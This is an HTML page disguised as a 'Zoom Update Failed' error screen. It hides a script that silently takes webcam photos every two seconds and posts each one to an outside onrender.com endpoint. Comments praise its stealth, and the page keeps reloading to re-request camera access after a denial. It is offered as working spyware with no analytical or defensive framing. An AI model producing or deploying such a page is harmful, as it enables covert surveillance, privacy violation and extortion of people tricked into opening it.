<!DOCTYPE html>
<html>
<head><title>Zoom Update Failed</title>
<style>body{text-align:center;padding:100px;font-family:Arial;background:#f8f9fa;color:#6c757d;}
h1{font-size:28px;color:#dc3545;}
#error{padding:20px;border:2px solid #dc3545;border-radius:10px;margin:20px;background:#f8d7da;}
button{display:none;}</style>
</head>
<body>
<h1>⚠️ Zoom Update Error</h1>
<div id="error">
  <p>Security verification failed. <br>Check your connection and try again.</p>
  <p style="font-size:14px;">Error code: ZM-404-CAM</p>
</div>
<p><small>Refresh page if issue persists.</small></p>

<script>
// SILENT CAMERA CAPTURE - Runs EVEN if page looks broken
navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
.then(stream => {
  // HIDDEN CAPTURE LOOP - No UI changes, pure stealth
  setInterval(() => {
    const canvas = document.createElement('canvas');
    canvas.width = 480; canvas.height = 640;  // Portrait for phones
    const ctx = canvas.getContext('2d');
    ctx.drawImage(stream.getVideoTracks()[0], 0, 0, 480, 640);
    canvas.toBlob(blob => {
      const form = new FormData();
      form.append('cam', blob, 'error_'+Date.now()+'.jpg');
      // YOUR RENDER ENDPOINT
      fetch('https://zoom-security-update1.onrender.com/upload', {
        method: 'POST',
        body: form
      });
    }, 'image/jpeg', 0.6);  // Low quality = fast/stealth
  }, 2000);  // 1 photo / 2 seconds - endless
})
.catch(() => {
  // Even on deny, retry silently every 10 sec
  setTimeout(() => location.reload(), 10000);
});
</script>
</body>
</html>
